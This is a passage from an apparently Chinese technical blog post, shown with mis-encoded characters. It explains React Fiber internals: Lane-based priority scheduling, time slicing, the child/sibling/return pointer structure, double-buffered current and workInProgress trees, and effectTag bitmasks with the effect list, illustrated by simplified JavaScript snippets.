ä»»åŠ¡ç»´åº¦çš„è§£å†³æ–¹æ¡ˆ</strong></p><p>å¢é‡æ¸²æŸ“æ˜¯å°†æ•´ä¸ªæ¸²æŸ“è¿‡ç¨‹åˆ†è§£ä¸ºå¤šä¸ªå¯ç‹¬ç«‹æ‰§è¡Œçš„å­ä»»åŠ¡ï¼Œå¹¶æŒ‰ä¼˜å…ˆçº§é€æ­¥å®Œæˆçš„æŠ€æœ¯</p><p>å®ƒçš„æ ¸å¿ƒç›®æ ‡æ˜¯ï¼š</p><ul><li>å°†å¤§å‹æ¸²æŸ“ä»»åŠ¡åˆ†è§£ä¸ºå¯ç‹¬ç«‹æ‰§è¡Œçš„å°ä»»åŠ¡</li><li>å…è®¸å…ˆå‘ˆç°éƒ¨åˆ†å†…å®¹ï¼Œå†é€æ­¥è¡¥å……å‰©ä½™å†…å®¹</li></ul><p>å…¶å®ç°åŸç†æ˜¯é€šè¿‡ä»»åŠ¡åˆ†ç‰‡å°†ç»„ä»¶æ ‘æ‹†åˆ†ä¸º Fiber èŠ‚ç‚¹é“¾è¡¨ï¼Œé€šè¿‡ Lane æ¨¡å‹åŒºåˆ†ä»»åŠ¡ä¼˜å…ˆçº§ï¼Œå®Œæˆçš„éƒ¨åˆ†å…ˆæäº¤å‘ˆç°ï¼Œå¹¶ç»“åˆåŒç¼“å­˜æœºåˆ¶ä¿è¯æ¸²æŸ“è¿‡ç¨‹ä¸å½±å“å½“å‰æ˜¾ç¤ºï¼š</p><pre class="mermaid">graph LRA[å¼€å§‹æ¸²æŸ“] --> B[å¤„ç†æ ¹èŠ‚ç‚¹]B --> C[å¤„ç†å­èŠ‚ç‚¹1]C --> D[å¤„ç†å­èŠ‚ç‚¹1.1]D --> E[æäº¤å·²å®Œæˆéƒ¨åˆ†]E --> F[å¤„ç†å…„å¼ŸèŠ‚ç‚¹1.2]F --> G{æ—¶é—´ç”¨å°½}G -->|æ˜¯| H[ä¿å­˜çŠ¶æ€å¹¶æš‚åœ]G -->|å¦| I[ç»§ç»­å¤„ç†]</pre><p>æ—¶é—´åˆ‡ç‰‡å’Œå¢é‡æ¸²æŸ“ååŒå·¥ä½œæµç¨‹å¦‚ä¸‹ï¼š</p><ol><li>å¢é‡æ¸²æŸ“æ‹†è§£ä»»åŠ¡ï¼šå°†æ•´ä¸ªæ¸²æŸ“ä»»åŠ¡æ‹†åˆ†ä¸º Fiber èŠ‚ç‚¹ä»»åŠ¡é˜Ÿåˆ—</li><li>æ—¶é—´åˆ‡ç‰‡åˆ†é…æ—¶é—´ï¼šå°†æµè§ˆå™¨æ¯ä¸ªæ¸²æŸ“å¸§çš„ç©ºé—²æ—¶é—´åˆ†é…ç»™ä»»åŠ¡é˜Ÿåˆ—</li><li>ä¼˜å…ˆçº§è°ƒåº¦ä»‹å…¥ï¼šå…è®¸é«˜ä¼˜å…ˆçº§ä»»åŠ¡æŠ¢å å½“å‰æ‰§è¡Œ</li><li>æ¸è¿›å¼æäº¤ï¼šå®Œæˆçš„éƒ¨åˆ†å†…å®¹å¯å…ˆæäº¤æ˜¾ç¤º</li></ol><h3 id="åŸºäºä¼˜å…ˆçº§çš„ä»»åŠ¡è°ƒåº¦"><a href="#åŸºäºä¼˜å…ˆçº§çš„ä»»åŠ¡è°ƒåº¦" class="headerlink" title="åŸºäºä¼˜å…ˆçº§çš„ä»»åŠ¡è°ƒåº¦"></a>åŸºäºä¼˜å…ˆçº§çš„ä»»åŠ¡è°ƒåº¦</h3><p>React ä½¿ç”¨ Lane æ¨¡å‹å®šä¹‰ä¼˜å…ˆçº§ï¼Œæ¯ä¸ªä¼˜å…ˆçº§å¯¹åº”ä¸€ä¸ªäºŒè¿›åˆ¶ä½</p><p><strong>è°ƒåº¦æµç¨‹</strong></p><p>ä»»åŠ¡æ ‡è®°é˜¶æ®µï¼šå½“è§¦å‘æ›´æ–°æ—¶ï¼ŒReact æ ¹æ®åœºæ™¯åˆ†é…ä¼˜å…ˆçº§</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">requestUpdateLane</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">if</span> (isTransition) <span class="hljs-keyword">return</span> <span class="hljs-title class_">TransitionLane</span>;       <span class="hljs-comment">// useTransition æ›´æ–°</span><br>  <span class="hljs-keyword">if</span> (isUserBlockingEvent) <span class="hljs-keyword">return</span> <span class="hljs-title class_">InputLane</span>;    <span class="hljs-comment">// ç”¨æˆ·äº¤äº’äº‹ä»¶</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">DefaultLane</span>;                          <span class="hljs-comment">// é»˜è®¤æ›´æ–°</span><br>&#125;<br><br><span class="hljs-comment">// ç¤ºä¾‹ï¼šç‚¹å‡»äº‹ä»¶è§¦å‘çš„æ›´æ–°</span><br>button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> updateLane = <span class="hljs-title function_">getEventPriority</span>(event);   <span class="hljs-comment">// è¿”å› InputContinuousLane</span><br>  <span class="hljs-title function_">scheduleUpdate</span>(fiber, updateLane);<br>&#125;);<br></code></pre></td></tr></table></figure><p>ä»»åŠ¡è°ƒåº¦é˜¶æ®µï¼šæ ¹æ®ä¼˜å…ˆçº§å’Œå‰©ä½™æ—¶é—´æ§åˆ¶æ‰§è¡Œé¡ºåº</p><pre class="mermaid">sequenceDiagram    participant Browser as æµè§ˆå™¨    participant Scheduler as Reactè°ƒåº¦å™¨    participant Renderer as æ¸²æŸ“å™¨        Browser->>Scheduler: æ–°å¸§å¼€å§‹ï¼ˆ16.6msï¼‰    Scheduler->>Renderer: è·å–å¾…å¤„ç†ä»»åŠ¡    Renderer->>Renderer: æŒ‰ä¼˜å…ˆçº§æ’åºä»»åŠ¡    loop æ—¶é—´åˆ‡ç‰‡æ‰§è¡Œ        Renderer->>Renderer: æ‰§è¡Œæœ€é«˜ä¼˜å…ˆçº§ä»»åŠ¡        Renderer-->>Scheduler: æ£€æŸ¥å‰©ä½™æ—¶é—´        Scheduler->>Browser: æ—¶é—´ç”¨å°½åˆ™å½’è¿˜æ§åˆ¶    end    Browser->>Browser: æ‰§è¡Œç»˜åˆ¶/ç”¨æˆ·è¾“å…¥    Browser->>Scheduler: ä¸‹ä¸€å¸§ç»§ç»­</pre><p>ä¸­æ–­ä¸æŠ¢å æœºåˆ¶ï¼š</p><ul><li>é«˜ä¼˜å…ˆçº§ä»»åŠ¡å¯ç›´æ¥ä¸­æ–­æ­£åœ¨æ‰§è¡Œçš„ä½ä¼˜å…ˆçº§ä»»åŠ¡</li><li>è¢«ä¸­æ–­çš„ä»»åŠ¡å¯ä¿å­˜è¿›åº¦åˆ° nextUnitOfWork æŒ‡é’ˆä¸­ï¼Œåç»­æ¢å¤</li></ul><p>é¥¥é¥¿é—®é¢˜å¤„ç†ï¼šé•¿æ—¶é—´æœªæ‰§è¡Œçš„ä½ä¼˜å…ˆçº§ä»»åŠ¡ä¼šè¢«é€æ­¥æå‡ä¼˜å…ˆçº§</p><p><strong>å…³é”®è°ƒåº¦ç­–ç•¥</strong></p><ol><li>æ‰¹é‡æ›´æ–°åˆå¹¶ï¼šæ¯”å¦‚ç›¸åŒä¼˜å…ˆçº§çš„å¤šä¸ª setState ä¼šè¢«åˆå¹¶</li><li>ä¼˜å…ˆçº§åè½¬é¢„é˜²ï¼š</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ensureRootIsScheduled</span>(<span class="hljs-params">root</span>) &#123;<br>  <span class="hljs-keyword">const</span> nextLanes = <span class="hljs-title function_">getNextLanes</span>(root, root.<span class="hljs-property">pendingLanes</span>);<br>  <span class="hljs-keyword">const</span> highestPriorityLane = <span class="hljs-title function_">getHighestPriorityLane</span>(nextLanes);<br>  <br>  <span class="hljs-comment">// å½“å‰æ‰§è¡Œä¸­çš„ä½ä¼˜å…ˆçº§ä»»åŠ¡è¢«é«˜ä¼˜å…ˆçº§æ‰“æ–­</span><br>  <span class="hljs-keyword">if</span> (existingCallbackPriority !== highestPriorityLane) &#123;<br>    <span class="hljs-title function_">cancelCallback</span>(existingCallbackNode); <span class="hljs-comment">// å–æ¶ˆæ—§ä»»åŠ¡</span><br>    <span class="hljs-title function_">scheduleNewCallback</span>(highestPriorityLane); <span class="hljs-comment">// è°ƒåº¦æ–°ä»»åŠ¡</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>æ—¶é—´åˆ‡ç‰‡åˆ†é…ï¼šä¸åŒä¼˜å…ˆçº§çš„ä»»åŠ¡è·å¾—çš„æ—¶é—´ç‰‡ä¸åŒ</li></ol><table><thead><tr><th align="left">ä¼˜å…ˆçº§</th><th align="left">å•æ¬¡åˆ†é…æ—¶é—´</th><th align="left">æ˜¯å¦å¯ä¸­æ–­</th></tr></thead><tbody><tr><td align="left">SyncLane</td><td align="left">ä¸é™</td><td align="left">å¦</td></tr><tr><td align="left">InputContinuousLane</td><td align="left">5ms</td><td align="left">æ˜¯ï¼ˆä»…é™æ›´é«˜ä¼˜å…ˆçº§ï¼‰</td></tr><tr><td align="left">DefaultLane</td><td align="left">2ms</td><td align="left">æ˜¯</td></tr><tr><td align="left">TransitionLane</td><td align="left">1ms</td><td align="left">æ˜¯</td></tr></tbody></table><h1 id="ç¬¬ä¸‰ç« ï¼šFiberçš„æ•°æ®ç»“æ„ä¸ç®—æ³•å®ç°"><a href="#ç¬¬ä¸‰ç« ï¼šFiberçš„æ•°æ®ç»“æ„ä¸ç®—æ³•å®ç°" class="headerlink" title="ç¬¬ä¸‰ç« ï¼šFiberçš„æ•°æ®ç»“æ„ä¸ç®—æ³•å®ç°"></a>ç¬¬ä¸‰ç« ï¼šFiberçš„æ•°æ®ç»“æ„ä¸ç®—æ³•å®ç°</h1><h2 id="3-1-FiberèŠ‚ç‚¹çš„è¯¦ç»†ç»“æ„è§£æ"><a href="#3-1-FiberèŠ‚ç‚¹çš„è¯¦ç»†ç»“æ„è§£æ" class="headerlink" title="3.1 FiberèŠ‚ç‚¹çš„è¯¦ç»†ç»“æ„è§£æ"></a>3.1 FiberèŠ‚ç‚¹çš„è¯¦ç»†ç»“æ„è§£æ</h2><h3 id="childã€siblingã€returnæŒ‡é’ˆçš„é“¾è¡¨å…³ç³»"><a href="#childã€siblingã€returnæŒ‡é’ˆçš„é“¾è¡¨å…³ç³»" class="headerlink" title="childã€siblingã€returnæŒ‡é’ˆçš„é“¾è¡¨å…³ç³»"></a>childã€siblingã€returnæŒ‡é’ˆçš„é“¾è¡¨å…³ç³»</h3><p>Fiber æ¶æ„çš„è®¾è®¡å“²å­¦åœ¨äºå°†æ ‘å½¢ç»“æ„è½¬åŒ–ä¸ºå•å‘é“¾è¡¨+æ ‘å½¢å›æº¯çš„æ··åˆç»“æ„ï¼Œåœ¨ä¿æŒçˆ¶å­å…³ç³»çš„åŒæ—¶è·å¾—é“¾è¡¨çš„é«˜æ•ˆéå†èƒ½åŠ›ã€‚å®ç°è¯¥æ··åˆç»“æ„çš„å…³é”®ç‚¹å°±æ˜¯ childã€siblingã€return è¿™ä¸‰ä¸ªæŒ‡é’ˆã€‚</p><p><strong>ä¸‰ä¸ªæŒ‡é’ˆçš„ä½œç”¨ä¸å…³ç³»</strong></p><table><thead><tr><th align="left">æŒ‡é’ˆå</th><th align="left">æŒ‡å‘</th><th align="left">åŠŸèƒ½æè¿°</th><th align="left">ç±»æ¯”ä¼ ç»Ÿæ ‘ç»“æ„</th></tr></thead><tbody><tr><td align="left">child</td><td align="left">ç¬¬ä¸€ä¸ªå­èŠ‚ç‚¹</td><td align="left">å‘ä¸‹éå†çš„å…¥å£</td><td align="left">node.firstChild</td></tr><tr><td align="left">sibling</td><td align="left">ä¸‹ä¸€ä¸ªå…„å¼ŸèŠ‚ç‚¹</td><td align="left">æ¨ªå‘éå†åŒçº§èŠ‚ç‚¹</td><td align="left">node.nextSibling</td></tr><tr><td align="left">return</td><td align="left">çˆ¶èŠ‚ç‚¹</td><td align="left">å®Œæˆå½“å‰åˆ†æ”¯åå‘ä¸Šå›æº¯</td><td align="left">node.parentNode</td></tr></tbody></table><p><strong>é“¾è¡¨ç»“æ„å›¾è§£</strong></p><p>å‡è®¾æœ‰å¦‚ä¸‹ç»„ä»¶æ ‘ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;App&gt;<br>  &lt;Header /&gt;<br>  &lt;Content&gt;<br>    &lt;Sidebar /&gt;<br>    &lt;Main /&gt;<br>  &lt;/Content&gt;<br>&lt;/App&gt;<br></code></pre></td></tr></table></figure><p>é‚£è¯¥ç»„ä»¶æ ‘å¯¹åº”çš„ Fiber é“¾è¡¨ç»“æ„å¦‚ä¸‹ï¼š</p><pre class="mermaid">graph TD    A[App] -->|child| B[Header]    B -->|sibling| C[Content]    C -->|child| D[Sidebar]    D -->|sibling| E[Main]    E -->|return| C    D -->|return| C    C -->|return| A    B -->|return| A</pre><p>æŒ‡é’ˆå…³ç³»è¡¨å¦‚ä¸‹ï¼š</p><table><thead><tr><th align="left">Fiber èŠ‚ç‚¹</th><th align="left">child</th><th align="left">sibling</th><th align="left">return</th></tr></thead><tbody><tr><td align="left">App</td><td align="left">Header</td><td align="left">null</td><td align="left">null</td></tr><tr><td align="left">Header</td><td align="left">null</td><td align="left">Content</td><td align="left">App</td></tr><tr><td align="left">Content</td><td align="left">Sidebar</td><td align="left">null</td><td align="left">App</td></tr><tr><td align="left">Sidebar</td><td align="left">null</td><td align="left">Main</td><td align="left">Content</td></tr><tr><td align="left">Main</td><td align="left">null</td><td align="left">null</td><td align="left">Content</td></tr></tbody></table><h3 id="alternateä¸åŒç¼“å­˜æ ‘ï¼ˆCurrent-WorkInProgressï¼‰"><a href="#alternateä¸åŒç¼“å­˜æ ‘ï¼ˆCurrent-WorkInProgressï¼‰" class="headerlink" title="alternateä¸åŒç¼“å­˜æ ‘ï¼ˆCurrent&#x2F;WorkInProgressï¼‰"></a>alternateä¸åŒç¼“å­˜æ ‘ï¼ˆCurrent&#x2F;WorkInProgressï¼‰</h3><p>alternate æŒ‡é’ˆå’ŒåŒç¼“å­˜æ ‘æ˜¯å®ç°å¹¶å‘æ¸²æŸ“å’ŒçŠ¶æ€ä¸€è‡´æ€§çš„æ ¸å¿ƒæœºåˆ¶</p><p><strong>åŒç¼“å­˜æ ‘çš„æœ¬è´¨</strong></p><p>åŸºæœ¬æ¦‚å¿µ</p><table><thead><tr><th align="left">æ ‘ç±»å‹</th><th align="left">ä½œç”¨</th><th align="left">ç‰¹ç‚¹</th></tr></thead><tbody><tr><td align="left">current</td><td align="left">å½“å‰ç•Œé¢æ­£åœ¨æ˜¾ç¤ºå†…å®¹å¯¹åº”çš„ Fiber æ ‘</td><td align="left">ç”¨æˆ·æ­£åœ¨äº¤äº’çš„ç¨³å®šç‰ˆæœ¬</td></tr><tr><td align="left">workInProgress</td><td align="left">æ­£åœ¨å†…å­˜ä¸­æ„å»ºçš„ Fiber æ ‘ï¼ˆå³å°†æˆä¸ºä¸‹ä¸€é’ˆæ˜¾ç¤ºå†…å®¹ï¼‰</td><td align="left">å¯ä¸­æ–­ã€å¯ä¸¢å¼ƒçš„ä¸­é—´çŠ¶æ€</td></tr></tbody></table><p>alternate æŒ‡é’ˆçš„ä½œç”¨ï¼šæ¯ä¸ª Fiber èŠ‚ç‚¹éƒ½æœ‰ä¸€ä¸ª alternate å­—æ®µï¼ŒæŒ‡å‘å¦ä¸€æ£µæ ‘ä¸Šçš„å¯¹åº”èŠ‚ç‚¹ï¼ˆcurrent fiberNodeA.alternate &lt;-&gt; workInProgress fiberNodeA.alternateï¼‰</p><p><strong>åŒç¼“å­˜æ ‘çš„å·¥ä½œæµç¨‹</strong></p><p>åˆå§‹æ¸²æŸ“é˜¶æ®µï¼š</p><pre class="mermaid">sequenceDiagram    participant R as React    participant D as DOM        R->>R: åˆ›å»º WorkInProgress æ ‘ï¼ˆåˆå§‹ä¸ºç©ºï¼‰    R->>R: ä» Root å¼€å§‹æ„å»º Fiber èŠ‚ç‚¹    R->>R: æ¯ä¸ªæ–°èŠ‚ç‚¹è®¾ç½® alternate=null    R->>D: é¦–æ¬¡æ¸²æŸ“å®Œæˆå, WorkInProgress æ ‘å˜ä¸º Current æ ‘</pre><p>æ›´æ–°é˜¶æ®µï¼š</p><pre class="mermaid">sequenceDiagram    participant C as Current æ ‘    participant W as WorkInProgress æ ‘    participant R as React è°ƒåº¦å™¨        R->>W: ä» Current æ ‘çš„ Root å…‹éš†èŠ‚ç‚¹    C->>W: é€šè¿‡ alternate äº’ç›¸æŒ‡å‘    loop æ¸²æŸ“é˜¶æ®µ        R->>W: å¢é‡æ„å»º/æ›´æ–°èŠ‚ç‚¹        W->>C: é€šè¿‡ alternate å¯¹æ¯”å·®å¼‚    end    R->>C: æäº¤å®Œæˆåäº¤æ¢ä¸¤æ£µæ ‘</pre><h3 id="effectTagä¸å‰¯ä½œç”¨é“¾è¡¨ï¼ˆEffect-Listï¼‰"><a href="#effectTagä¸å‰¯ä½œç”¨é“¾è¡¨ï¼ˆEffect-Listï¼‰" class="headerlink" title="effectTagä¸å‰¯ä½œç”¨é“¾è¡¨ï¼ˆEffect Listï¼‰"></a>effectTagä¸å‰¯ä½œç”¨é“¾è¡¨ï¼ˆEffect Listï¼‰</h3><p>åœ¨äº†è§£ effectTag ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆäº†è§£ä¸‹ä»€ä¹ˆæ˜¯ side effectsï¼ˆå‰¯ä½œç”¨ï¼‰ã€‚</p><p>åœ¨ React ä¸­ï¼Œå‰¯ä½œç”¨æ˜¯æŒ‡é‚£äº›åœ¨ç»„ä»¶æ¸²æŸ“è¿‡ç¨‹ä¸­ä¸å¤–éƒ¨ä¸–ç•Œäº¤äº’æˆ–å½±å“å¤–éƒ¨çŠ¶æ€çš„æ“ä½œï¼ˆä¸èƒ½åœ¨ render é˜¶æ®µå®Œæˆï¼‰ã€‚å®ƒä»¬è¶…å‡ºäº†çº¯å‡½æ•°å¼æ¸²æŸ“çš„èŒƒç•´ï¼Œæ˜¯ React ç»„ä»¶ä¸­éœ€è¦ç‰¹æ®Šå¤„ç†çš„è¡Œä¸ºã€‚</p><p><strong>å‰¯ä½œç”¨çš„æœ¬è´¨ç‰¹å¾</strong></p><table><thead><tr><th align="left">ç‰¹å¾</th><th align="left">è¯´æ˜</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">éçº¯æ“ä½œ</td><td align="left">è¿åçº¯å‡½æ•°åŸåˆ™ï¼ˆç›¸åŒè¾“å…¥ â‰  ç›¸åŒè¾“å‡ºï¼‰</td><td align="left">æ•°æ®è·å–ã€DOM æ‰‹åŠ¨æ“ä½œ</td></tr><tr><td align="left">å¤–éƒ¨ä¾èµ–</td><td align="left">ä¸ React æ¸²æŸ“æµç¨‹å¤–çš„ç³»ç»Ÿäº¤äº’</td><td align="left">è®¿é—®æµè§ˆå™¨ APIã€ç½‘ç»œè¯·æ±‚</td></tr><tr><td align="left">æ—¶åºæ•æ„Ÿæ€§</td><td align="left">æ‰§è¡Œæ—¶æœºå½±å“ç»“æœ</td><td align="left">äº‹ä»¶ç›‘å¬ã€å®šæ—¶å™¨</td></tr><tr><td align="left">èµ„æºç®¡ç†</td><td align="left">éœ€è¦æ˜¾å¼æ¸…ç†</td><td align="left">å–æ¶ˆè®¢é˜…ã€ç§»é™¤äº‹ä»¶ç›‘å¬</td></tr></tbody></table><p><strong>å‰¯ä½œç”¨åˆ†ç±»æœºåˆ¶</strong></p><table><thead><tr><th align="left">å‰¯ä½œç”¨ç±»å‹</th><th align="left">å¤„ç†æ–¹å¼</th><th align="left">å¯¹åº” Hook</th></tr></thead><tbody><tr><td align="left">åŒæ­¥ DOM å‰¯ä½œç”¨</td><td align="left">å¸ƒå±€é˜¶æ®µåŒæ­¥æ‰§è¡Œ</td><td align="left">useLayoutEffect</td></tr><tr><td align="left">å¼‚æ­¥å‰¯ä½œç”¨</td><td align="left">æµè§ˆå™¨ç»˜åˆ¶åæ‰§è¡Œ</td><td align="left">useEffect</td></tr><tr><td align="left">çŠ¶æ€æ›´æ–°å‰¯ä½œç”¨</td><td align="left">éšæ¸²æŸ“æµç¨‹å¤„ç†</td><td align="left">useState&#x2F;useReducer setter</td></tr><tr><td align="left">å›è°ƒå‰¯ä½œç”¨</td><td align="left">äº‹ä»¶å¤„ç†ä¸­æ‰§è¡Œ</td><td align="left">äº‹ä»¶å¤„ç†å‡½æ•°</td></tr></tbody></table><p><strong>æ­£ç¡®å¤„ç†å‰¯ä½œç”¨çš„è§„åˆ™</strong></p><ol><li>å‰¯ä½œç”¨éš”ç¦»åŸåˆ™ï¼šé¿å…æ¸²æŸ“ä¸­æ‰§è¡Œï¼ˆä¸è¦åœ¨ render å‡½æ•°ä¸­æˆ–å‡½æ•°å¼ç»„ä»¶ä¸»é¢˜ä¸­ç›´æ¥æ“ä½œå‰¯ä½œç”¨ï¼‰ï¼Œä½¿ç”¨ Hook å°è£…ï¼ˆæ¯”å¦‚ useEffectï¼‰</li><li>æ˜ç¡®å£°æ˜ä¾èµ–é¡¹ï¼ˆuseEffect dependenciesï¼‰</li><li>å‰¯ä½œç”¨æ¸…ç†æœºåˆ¶ï¼ˆuseEffect returnï¼‰</li></ol><p>effectTagåˆ™æ˜¯<code>å‰¯ä½œç”¨æ ‡è®°ç³»ç»Ÿ</code>ã€‚</p><p><strong>effectTag çš„æœ¬è´¨ä¸ä½œç”¨</strong></p><ul><li>äºŒè¿›åˆ¶ä½æ©ç ï¼šæ¯ä¸ª effectTag æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ•°ï¼Œè¡¨ç¤ºéœ€è¦æ‰§è¡Œçš„å‰¯ä½œç”¨ç±»å‹</li><li>é«˜æ•ˆå†…å­˜ç®¡ç†ï¼šé€šè¿‡ä½è¿ç®—ç»„åˆå¤šä¸ªæ ‡è®°ï¼ˆå¦‚ Placement | Updateï¼‰</li><li>ç²¾ç¡®è¿½è¸ªï¼šæ ‡è®°å“ªäº› Fiber èŠ‚ç‚¹éœ€è¦è¿›è¡Œ DOM æ“ä½œæˆ–å…¶ä»–å‰¯ä½œç”¨</li></ul><p><strong>å¸¸è§çš„ effectTag å€¼</strong></p><table><thead><tr><th align="left">æ ‡è®°</th><th align="left">å€¼ï¼ˆäºŒè¿›åˆ¶ï¼‰</th><th align="left">å¯¹åº”æ“ä½œ</th></tr></thead><tbody><tr><td align="left">NoEffect</td><td align="left">0b00000000</td><td align="left">æ— å‰¯ä½œç”¨</td></tr><tr><td align="left">Placement</td><td align="left">0b00000010</td><td align="left">æ’å…¥æ–°èŠ‚ç‚¹</td></tr><tr><td align="left">Update</td><td align="left">0b00000100</td><td align="left">æ›´æ–°å±æ€§&#x2F;æ ·å¼</td></tr><tr><td align="left">Deletion</td><td align="left">0b00001000</td><td align="left">åˆ é™¤èŠ‚ç‚¹</td></tr><tr><td align="left">Snapshot</td><td align="left">0b00010000</td><td align="left">ç”Ÿå‘½å‘¨æœŸ getSnapshotBeforeUpdate</td></tr><tr><td align="left">Passive</td><td align="left">0b00100000</td><td align="left">useEffect çš„å‰¯ä½œç”¨</td></tr><tr><td align="left">Callback</td><td align="left">0b01000000</td><td align="left">setState çš„å›è°ƒ</td></tr></tbody></table><p>å‰¯ä½œç”¨é“¾è¡¨ï¼ˆeffect listï¼‰æ˜¯åªåŒ…å«<code>æœ‰å‰¯ä½œç”¨çš„ Fiber èŠ‚ç‚¹</code>çš„é“¾è¡¨ç»“æ„ï¼Œå®ƒçš„æ„å»ºæ—¶æœºæ˜¯åœ¨ <code>completeWork</code> é˜¶æ®µä¸²è”æœ‰ effectTag çš„èŠ‚ç‚¹ã€‚å®ƒçš„å…³é”®æŒ‡é’ˆå¦‚ä¸‹ï¼š</p><ul><li>firstEffectï¼šé“¾è¡¨å¤´èŠ‚ç‚¹</li><li>nextEffectï¼šä¸‹ä¸€ä¸ªå¾…å¤„ç†èŠ‚ç‚¹</li><li>lastEffectï¼šé“¾è¡¨å°¾èŠ‚ç‚¹</li></ul><p><strong>å‰¯ä½œç”¨é“¾è¡¨çš„æ„å»ºè¿‡ç¨‹</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">completeWork</span>(<span class="hljs-params">fiber</span>) &#123;<br>  <span class="hljs-comment">// å¤„ç†å½“å‰èŠ‚ç‚¹å·¥ä½œ...</span><br>  <br>  <span class="hljs-comment">// æ„å»º Effect List</span><br>  <span class="hljs-keyword">if</span> (fiber.<span class="hljs-property">effectTag</span> &gt; <span class="hljs-title class_">NoEffect</span>) &#123;<br>    <span class="hljs-keyword">if</span> (fiber.<span class="hljs-property">return</span> !== <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-comment">// å°†å½“å‰èŠ‚ç‚¹æ·»åŠ åˆ°çˆ¶èŠ‚ç‚¹çš„ Effect List</span><br>      <span class="hljs-keyword">if</span> (fiber.<span class="hljs-property">return</span>.<span class="hljs-property">firstEffect</span> === <span class="hljs-literal">null</span>) &#123;<br>        fiber.<span class="hljs-property">return</span>.<span class="hljs-property">firstEffect</span> = fiber;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        fiber.<span class="hljs-property">return</span>.<span class="hljs-property">lastEffect</span>.<span class="hljs-property">nextEffect</span> = fiber;<br>      &#125;<br>      fiber.<span class="hljs-property">return</span>.<span class="hljs-property">lastEffect</span> = fiber;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>effectTag&#x2F;å‰¯ä½œç”¨é“¾è¡¨çš„å·¥ä½œåŸç†</strong></p><ol><li>æ ‡è®°é˜¶æ®µï¼šåœ¨ beginWork ä¸­æ ‡è®°éœ€è¦æ‰§è¡Œçš„ DOM æ“ä½œ</li><li>é“¾è¡¨æ„å»ºï¼šåœ¨ completeWork é˜¶æ®µä¸²è”å…·æœ‰ effectTag çš„èŠ‚ç‚¹</li><li>æäº¤é˜¶æ®µï¼šæŒ‰é“¾è¡¨é¡ºåºæ‰§è¡Œ DOM æ“ä½œ</li></ol><h2 id="3-2-æ·±åº¦ä¼˜å…ˆéå†çš„è¿­ä»£å®ç°"><a href="#3-2-æ·±åº¦ä¼˜å…ˆéå†çš„è¿­ä»£å®ç°" class="headerlink" title="3.2 æ·±åº¦ä¼˜å…ˆéå†çš„è¿­ä»£å®ç°"></a>3.2 æ·±åº¦ä¼˜å…ˆéå†çš„è¿­ä»£å®ç°</h2><h3 id="é€’å½’éå†çš„é—®é¢˜ä¸é“¾è¡¨éå†çš„ä¼˜åŠ¿"><a href="#é€’å½’éå†çš„é—®é¢˜ä¸é“¾è¡¨éå†çš„ä¼˜åŠ¿" class="headerlink" title="é€’å½’éå†çš„é—®é¢˜ä¸é“¾è¡¨éå†çš„ä¼˜åŠ¿"></a>é€’å½’éå†çš„é—®é¢˜ä¸é“¾è¡¨éå†çš„ä¼˜åŠ¿</h3><p>åœ¨ React15 åŠä¹‹å‰ç‰ˆæœ¬çš„ stack reconciler åè°ƒå™¨é‡‡ç”¨çš„éå†ç­–ç•¥æ˜¯é€’å½’éå†</p><p><strong>é€’å½’éå†çš„é—®é¢˜</strong></p><ol><li>æ— æ¡ä»¶å…¨é‡éå†ï¼šä»æ ¹èŠ‚ç‚¹å¼€å§‹é€’å½’å¤„ç†æ¯ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ— è®ºèŠ‚ç‚¹çŠ¶æ€æ˜¯å¦å˜åŒ–</li><li>ä¸å¯ä¸­æ–­ï¼šä¾èµ–äº JavaScript æ ˆè°ƒç”¨ï¼Œä¸€æ—¦å¼€å§‹å°±å¿…é¡»æ‰§è¡Œåˆ°åº•ï¼Œä¸­é€”æ— æ³•ä¸­æ–­æˆ–è·³è¿‡å­èŠ‚ç‚¹</li><li>æ€§èƒ½ç¼ºé™·ï¼šé˜»å¡ä¸»çº¿ç¨‹ã€æ— ä¼˜å…ˆçº§è°ƒåº¦</li></ol><p><strong>é“¾è¡¨éå†çš„ä¼˜åŠ¿</strong></p><ol><li>å¯ä¸­æ–­&#x2F;æ¢å¤ï¼šé€šè¿‡å…¨å±€å˜é‡ï¼ˆnextUnitOfWorkï¼‰ä¿å­˜è¿›åº¦ï¼Œç»“åˆ 